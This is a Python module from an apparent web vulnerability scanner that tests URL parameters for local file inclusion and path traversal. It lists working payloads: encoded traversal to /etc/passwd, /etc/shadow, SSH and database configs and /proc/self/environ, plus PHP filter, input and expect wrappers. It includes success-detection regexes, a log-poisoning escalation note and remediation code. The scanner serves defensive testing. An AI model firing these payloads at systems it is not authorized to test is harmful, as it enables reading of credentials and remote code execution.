"""
Local File Inclusion (LFI) / Path Traversal Module (v1.5.0)
Deep coverage: filter bypasses, PHP wrappers, log poisoning detection,
RFI, null byte injection, Windows paths, proc/self exploitation.
"""
from __future__ import annotations
import re
from typing import List, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

# (payload, description)
LFI_PAYLOADS: List[Tuple[str, str]] = [
    # ── Basic traversal
    ("../../etc/passwd",                     "basic 2-level"),
    ("../../../etc/passwd",                  "basic 3-level"),
    ("../../../../etc/passwd",               "basic 4-level"),
    ("../../../../../etc/passwd",            "basic 5-level"),
    ("../../../../../../etc/passwd",         "basic 6-level"),
    # ── URL encoded traversal (bypass input filters)
    ("..%2f..%2f..%2fetc%2fpasswd",          "URL-encoded slash"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL-encoded dot+slash"),
    ("..%252f..%252f..%252fetc%252fpasswd",  "double URL-encoded"),
    ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "overlong UTF-8 slash"),
    ("..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd", "full-width slash"),
    # ── Dot-dot bypass tricks
    ("....//....//....//etc/passwd",          "stripped-dot bypass"),
    ("..\\..\\..\\etc\\passwd",              "Windows-style backslash"),
    # ── PHP wrappers (PHP apps only)
    ("php://filter/convert.base64-encode/resource=index.php", "PHP filter wrapper"),
    ("php://filter/read=string.rot13/resource=../../etc/passwd", "PHP ROT13 filter"),
    ("php://input",                           "PHP input wrapper"),
    ("data://text/plain;base64,SSBsb3ZlIFBIUAo=", "PHP data wrapper"),
    ("expect://id",                           "PHP expect wrapper (RCE)"),
    # ── /proc/self exploitation
    ("../../proc/self/environ",              "proc environ (env vars)"),
    ("../../proc/self/cmdline",              "proc cmdline"),
    ("../../proc/self/fd/0",                 "proc fd stdin"),
    # ── Linux sensitive files
    ("../../etc/shadow",                     "shadow passwords"),
    ("../../etc/ssh/sshd_config",            "SSH config"),
    ("../../etc/hosts",                      "hosts file"),
    ("../../etc/mysql/my.cnf",               "MySQL config"),
    ("../../var/log/apache2/access.log",     "Apache log (log poisoning)"),
    ("../../var/log/nginx/access.log",       "Nginx log (log poisoning)"),
    # ── Windows paths
    ("../../windows/system32/drivers/etc/hosts", "Windows hosts"),
    ("../../windows/win.ini",                "Windows win.ini"),
    ("../../boot.ini",                       "Windows boot.ini"),
    # ── Null byte bypass (old PHP <5.3)
    ("../../etc/passwd%00.jpg",              "null byte bypass"),
    ("../../etc/passwd\x00.php",             "null byte (binary)"),
]

LFI_SUCCESS_PATTERNS = [
    re.compile(r"root:[x*]?:0:0:"),
    re.compile(r"daemon:[x*]?:\d+:\d+:"),
    re.compile(r"[a-z_][a-z0-9_-]*:[x*!*]?:\d+:\d+:[^:]*:[^:]+:/"),  # generic /etc/passwd
    re.compile(r"\[boot loader\]", re.I),
    re.compile(r"127\.0\.0\.1\s+localhost"),
    re.compile(r"HTTP_USER_AGENT"),
    re.compile(r"DOCUMENT_ROOT="),
    re.compile(r"bin:/(?:bin|sbin|usr)"),
    re.compile(r"\[extensions\]"),  # win.ini
    re.compile(r"\[fonts\]"),       # win.ini
    re.compile(r"for 16-bit app", re.I),  # boot.ini
    re.compile(r"TERM="),           # proc/environ
    re.compile(r"SSH_CLIENT="),     # proc/environ
    re.compile(r"<?php\s", re.I),   # PHP source leak via wrapper
]

# PHP base64 wrapper success: look for base64-encoded PHP source
PHP_BASE64_PATTERN = re.compile(r"[A-Za-z0-9+/]{100,}={0,2}")

FILE_PARAMS = [
    "file", "path", "page", "include", "template", "view",
    "doc", "document", "load", "read", "source", "lang",
    "language", "conf", "config", "dir", "folder", "module",
    "content", "data", "download", "redirect", "url",
]


def _build_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    all_params = {k: v[0] if isinstance(v, list) else v
                  for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
    all_params[param] = value
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                       parsed.params, urlencode(all_params), ""))


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())

    # Prioritize file-related params, fall back to all
    test_params = [p for p in params if p.lower() in FILE_PARAMS]
    if not test_params:
        test_params = params[:4]
    if not test_params:
        return []

    with get_client(timeout=min(timeout, 7.0)) as client:
        try:
            baseline = client.get(url).text
        except Exception:
            return []

        for param in test_params[:4]:
            for (payload, payload_desc) in LFI_PAYLOADS:
                test_url = _build_url(url, param, payload)
                try:
                    body = client.get(test_url).text
                except Exception:
                    continue

                if body == baseline or not body:
                    continue

                # Check standard LFI success patterns
                for pattern in LFI_SUCCESS_PATTERNS:
                    if pattern.search(body):
                        is_php_wrapper = "php://" in payload
                        is_log_poisoning = "access.log" in payload or "error.log" in payload
                        is_proc = "proc/self" in payload

                        desc_extra = ""
                        if is_log_poisoning:
                            desc_extra = (
                                "\n\nLog Poisoning RCE path: inject PHP code via User-Agent header, "
                                "then include the log file to execute it."
                            )
                        elif is_php_wrapper and "base64" in payload:
                            desc_extra = "\n\nPHP filter wrapper reveals base64-encoded source code."
                        elif is_proc:
                            desc_extra = "\n\n/proc/self/environ reveals environment variables including secrets."

                        findings.append(Finding(
                            title=f"LFI / Path Traversal ({payload_desc}) — param: {param}",
                            severity=Severity.CRITICAL,
                            description=(
                                f"The '{param}' parameter is vulnerable to Local File Inclusion. "
                                f"Technique: {payload_desc}. The server returned system file content. "
                                "Attackers can read /etc/passwd, SSH keys, database configs, "
                                "application source code, and escalate to RCE via log poisoning."
                                + desc_extra
                            ),
                            evidence=(
                                f"Parameter: {param}\n"
                                f"Technique: {payload_desc}\n"
                                f"Payload: {payload}\n"
                                f"Pattern matched: {pattern.pattern}\n"
                                f"Response: {body[:300]}"
                            ),
                            remediation=(
                                "Never pass user input to file system functions. "
                                "Use a strict allowlist of permitted file names/paths. "
                                "Resolve absolute path and verify it stays within allowed directory."
                            ),
                            code_fix=(
                                "import os\n\n"
                                "ALLOWED_DIR = os.path.realpath('/var/www/templates/')\n\n"
                                "def safe_include(filename):\n"
                                "    # Strip ALL directory traversal first\n"
                                "    filename = os.path.basename(filename)  # strip path\n"
                                "    full_path = os.path.realpath(os.path.join(ALLOWED_DIR, filename))\n"
                                "    # Verify within allowed directory\n"
                                "    if not full_path.startswith(ALLOWED_DIR + os.sep):\n"
                                "        raise ValueError('Path traversal blocked')\n"
                                "    return open(full_path).read()\n\n"
                                "# Also disable PHP wrappers in php.ini:\n"
                                "allow_url_include = Off\n"
                                "allow_url_fopen = Off"
                            ),
                            reference="https://portswigger.net/web-security/file-path-traversal",
                            cvss=9.8,
                        ))
                        return findings

                # PHP base64 wrapper: large base64 string = source leak
                if "base64" in payload and PHP_BASE64_PATTERN.search(body):
                    if len(PHP_BASE64_PATTERN.findall(body)) >= 1:
                        # Try decoding to confirm PHP source
                        import base64 as _b64
                        for match in PHP_BASE64_PATTERN.finditer(body):
                            try:
                                decoded = _b64.b64decode(match.group(0) + "==").decode("utf-8", errors="replace")
                                if "<?php" in decoded or "function " in decoded:
                                    findings.append(Finding(
                                        title=f"PHP Source Code Disclosed via php://filter — param: {param}",
                                        severity=Severity.CRITICAL,
                                        description=(
                                            f"PHP wrapper LFI confirmed on '{param}'. "
                                            "The php://filter/base64 wrapper returned base64-encoded PHP source code. "
                                            "Attackers can read ALL PHP files including database credentials, "
                                            "API keys, and business logic."
                                        ),
                                        evidence=(
                                            f"Parameter: {param}\n"
                                            f"Payload: {payload}\n"
                                            f"Decoded source snippet: {decoded[:200]}"
                                        ),
                                        remediation=(
                                            "Disable PHP wrappers: allow_url_include=Off\n"
                                            "Never pass user input to include/require/file_get_contents"
                                        ),
                                        reference="https://portswigger.net/web-security/file-path-traversal",
                                        cvss=9.8,
                                    ))
                                    return findings
                            except Exception:
                                continue
    return findings
